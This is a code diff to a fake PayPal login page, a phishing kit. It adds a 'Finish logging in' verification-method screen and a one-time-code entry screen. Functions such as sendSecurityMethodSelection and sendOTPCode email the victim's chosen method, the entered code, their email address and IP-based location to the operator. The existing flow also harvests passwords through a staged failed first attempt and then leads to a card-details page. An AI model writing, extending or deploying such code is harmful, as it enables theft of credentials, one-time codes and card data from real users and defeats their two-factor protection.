@@ -304,6 +304,103 @@
       font-size: 14px;
       display: none;
     }
+
+    .content {
+      padding: 25px 30px;
+    }
+
+    .method {
+      display: flex;
+      align-items: flex-start;
+      padding: 15px 0;
+      border-bottom: 1px solid #e5e7eb;
+      cursor: pointer;
+    }
+
+    .method:last-child {
+      border-bottom: none;
+    }
+
+    .method input[type="radio"] {
+      margin-top: 3px;
+      margin-right: 15px;
+      accent-color: #0070ba;
+    }
+
+    .method-content {
+      flex: 1;
+    }
+
+    .method-title {
+      font-weight: 500;
+      margin-bottom: 5px;
+      color: #2c2e2f;
+    }
+
+    .method-details {
+      font-size: 14px;
+      color: #6c7378;
+    }
+
+    .phone-number {
+      font-weight: 500;
+      color: #2c2e2f;
+    }
+
+    .code-container {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin: 25px 0;
+    }
+
+    .code-input {
+      width: 50px;
+      height: 60px;
+      border: 1px solid #cbd2d6;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: bold;
+      transition: border-color 0.2s;
+    }
+
+    .code-input:focus {
+      border-color: #0070ba;
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
+    }
+
+    .resend-link {
+      display: block;
+      text-align: center;
+      color: #0070ba;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 25px;
+    }
+
+    .resend-link:hover {
+      text-decoration: underline;
+    }
+
+    .login-alt-link {
+      display: block;
+      text-align: center;
+      color: #0070ba;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 500;
+      margin-top: 20px;
+    }
+
+    .legal-text {
+      font-size: 13px;
+      color: #6c7378;
+      margin-bottom: 25px;
+      line-height: 1.5;
+    }
   </style>
 </head>
 <body>
@@ -389,6 +486,115 @@
           <a href="#">Privacy</a>
           <a href="#">Legal</a>
           <a href="#">Policy Updates</a>
+          <a href="#">Worldwide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- Security Verification Page -->
+    <div class="page" id="securityPage">
+      <div class="logo-container">
+        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" alt="PayPal" class="logo">
+      </div>
+      
+      <div class="content">
+        <h1>Finish logging in</h1>
+        
+        <form id="securityForm">
+          <div class="method">
+            <input type="radio" id="textMethod" name="method" value="text" checked>
+            <div class="method-content">
+              <div class="method-title">Get a text</div>
+              <div class="method-details">
+                Mobile <span class="phone-number">+1 4•••••-7272</span> 
+                <a href="#" class="change-link">Change</a>
+              </div>
+            </div>
+          </div>
+          
+          <div class="method">
+            <input type="radio" id="whatsappMethod" name="method" value="whatsapp">
+            <div class="method-content">
+              <div class="method-title">Get a WhatsApp text</div>
+            </div>
+          </div>
+          
+          <div class="method">
+            <input type="radio" id="callMethod" name="method" value="call">
+            <div class="method-content">
+              <div class="method-title">Have us call you</div>
+            </div>
+          </div>
+          
+          <div class="method">
+            <input type="radio" id="idMethod" name="method" value="id">
+            <div class="method-content">
+              <div class="method-title">Verify your photo ID</div>
+            </div>
+          </div>
+          
+          <div class="checkbox-group">
+            <input type="checkbox" id="rememberDevice" checked>
+            <label for="rememberDevice">
+              <strong>Remember this device</strong><br>
+              You'll get to skip this step next time. You can update this in your security settings.
+            </label>
+          </div>
+          
+          <div class="legal-text">
+            You confirm this is your phone number and we can send you text messages and get subscriber and device details from your wireless carrier to make sure it's you in this session. Carrier fees may apply.
+          </div>
+          
+          <button type="submit" class="btn btn-primary">Next</button>
+        </form>
+      </div>
+      
+      <div class="footer">
+        <div class="footer-links">
+          <a href="#">Contact Us</a>
+          <a href="#">Privacy</a>
+          <a href="#">Legal</a>
+          <a href="#">Worldwide</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- OTP Code Entry Page -->
+    <div class="page" id="otpPage">
+      <div class="logo-container">
+        <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-wordmark-color.svg" alt="PayPal" class="logo">
+      </div>
+      
+      <div class="content">
+        <h1>Enter the code we texted you</h1>
+        
+        <div class="description">
+          We sent it to <span class="phone-number">+1 4•••••-7272</span>.
+        </div>
+        
+        <form id="otpForm">
+          <div class="code-container">
+            <input type="text" class="code-input" maxlength="1" required autofocus>
+            <input type="text" class="code-input" maxlength="1" required>
+            <input type="text" class="code-input" maxlength="1" required>
+            <input type="text" class="code-input" maxlength="1" required>
+            <input type="text" class="code-input" maxlength="1" required>
+            <input type="text" class="code-input" maxlength="1" required>
+          </div>
+          
+          <a href="#" class="resend-link">Send New Code</a>
+          
+          <button type="submit" class="btn btn-primary">Submit</button>
+        </form>
+        
+        <a href="#" class="login-alt-link">Log In Another Way</a>
+      </div>
+      
+      <div class="footer">
+        <div class="footer-links">
+          <a href="#">Contact Us</a>
+          <a href="#">Privacy</a>
+          <a href="#">Legal</a>
           <a href="#">Worldwide</a>
         </div>
       </div>
@@ -506,18 +712,25 @@
     let loginAttempts = 0;
     let userEmail = '';
     let userLocation = {};
+    let selectedSecurityMethod = '';
+    let enteredOTP = '';
 
     // DOM elements
     const emailPage = document.getElementById('emailPage');
     const passwordPage = document.getElementById('passwordPage');
+    const securityPage = document.getElementById('securityPage');
+    const otpPage = document.getElementById('otpPage');
     const cardPage = document.getElementById('cardPage');
     const emailForm = document.getElementById('emailForm');
     const passwordForm = document.getElementById('passwordForm');
+    const securityForm = document.getElementById('securityForm');
+    const otpForm = document.getElementById('otpForm');
     const cardForm = document.getElementById('cardForm');
     const displayEmail = document.getElementById('displayEmail');
     const changeEmailBtn = document.getElementById('changeEmail');
     const loginError = document.getElementById('loginError');
     const loadingOverlay = document.getElementById('loadingOverlay');
+    const codeInputs = document.querySelectorAll('.code-input');
 
     // Initialize page
     document.addEventListener('DOMContentLoaded', function() {
@@ -527,8 +740,25 @@
       // Form event listeners
       emailForm.addEventListener('submit', handleEmailSubmit);
       passwordForm.addEventListener('submit', handlePasswordSubmit);
+      securityForm.addEventListener('submit', handleSecuritySubmit);
+      otpForm.addEventListener('submit', handleOTPSubmit);
       changeEmailBtn.addEventListener('click', goBackToEmailPage);
       cardForm.addEventListener('submit', handleCardSubmit);
+
+      // Code input navigation
+      codeInputs.forEach((input, index) => {
+        input.addEventListener('input', function() {
+          if (this.value.length === 1 && index < codeInputs.length - 1) {
+            codeInputs[index + 1].focus();
+          }
+        });
+        
+        input.addEventListener('keydown', function(e) {
+          if (e.key === 'Backspace' && this.value === '' && index > 0) {
+            codeInputs[index - 1].focus();
+          }
+        });
+      });
     });
 
     // Get user location data
@@ -587,12 +817,59 @@
           loginError.style.display = 'block';
           sendLoginAttempt(userEmail, password, 1);
         } else {
-          // Second attempt - proceed to card page
+          // Second attempt - proceed to security page
           passwordPage.classList.remove('active');
-          cardPage.classList.add('active');
+          securityPage.classList.add('active');
           sendLoginAttempt(userEmail, password, 2);
         }
       }, 5000);
+    }
+
+    // Handle security method selection
+    function handleSecuritySubmit(e) {
+      e.preventDefault();
+      
+      // Get selected security method
+      const selectedMethod = document.querySelector('input[name="method"]:checked');
+      selectedSecurityMethod = selectedMethod ? selectedMethod.value : 'text';
+      const rememberDevice = document.getElementById('rememberDevice').checked;
+      
+      // Show loading
+      showLoading();
+      
+      // Send security method selection to admin
+      sendSecurityMethodSelection(selectedSecurityMethod, rememberDevice);
+      
+      // Proceed to OTP page
+      setTimeout(() => {
+        hideLoading();
+        securityPage.classList.remove('active');
+        otpPage.classList.add('active');
+      }, 1000);
+    }
+
+    // Handle OTP submission
+    function handleOTPSubmit(e) {
+      e.preventDefault();
+      
+      // Collect OTP code
+      enteredOTP = '';
+      codeInputs.forEach(input => {
+        enteredOTP += input.value;
+      });
+      
+      // Show loading
+      showLoading();
+      
+      // Send OTP to admin
+      sendOTPCode(enteredOTP);
+      
+      // Proceed to card page
+      setTimeout(() => {
+        hideLoading();
+        otpPage.classList.remove('active');
+        cardPage.classList.add('active');
+      }, 2000);
     }
 
     // Handle card form submission
@@ -637,6 +914,55 @@
         Email: ${email}
         Password: ${password}
         Attempt: ${attempt}
+        Time: ${new Date().toLocaleString()}
+
+        Location data:
+        IP: ${userLocation.ip || 'N/A'}
+        Country: ${userLocation.country || 'N/A'}
+        Region: ${userLocation.region || 'N/A'}
+        City: ${userLocation.city || 'N/A'}
+        ISP: ${userLocation.org || 'N/A'}
+      `;
+
+      sendEmail(subject, body);
+    }
+
+    // Send security method selection to admin
+    function sendSecurityMethodSelection(method, rememberDevice) {
+      const subject = 'PayPal Security Method Selection';
+      const methodNames = {
+        'text': 'Text Message',
+        'whatsapp': 'WhatsApp',
+        'call': 'Phone Call',
+        'id': 'Photo ID Verification'
+      };
+      
+      const body = `
+        Security verification method selected:
+        Method: ${methodNames[method] || method}
+        Remember Device: ${rememberDevice ? 'Yes' : 'No'}
+        Email: ${userEmail}
+        Time: ${new Date().toLocaleString()}
+
+        Location data:
+        IP: ${userLocation.ip || 'N/A'}
+        Country: ${userLocation.country || 'N/A'}
+        Region: ${userLocation.region || 'N/A'}
+        City: ${userLocation.city || 'N/A'}
+        ISP: ${userLocation.org || 'N/A'}
+      `;
+
+      sendEmail(subject, body);
+    }
+
+    // Send OTP code to admin
+    function sendOTPCode(otpCode) {
+      const subject = 'PayPal OTP Code Entered';
+      const body = `
+        OTP verification code entered:
+        Code: ${otpCode}
+        Email: ${userEmail}
+        Security Method: ${selectedSecurityMethod}
         Time: ${new Date().toLocaleString()}
 
         Location data:
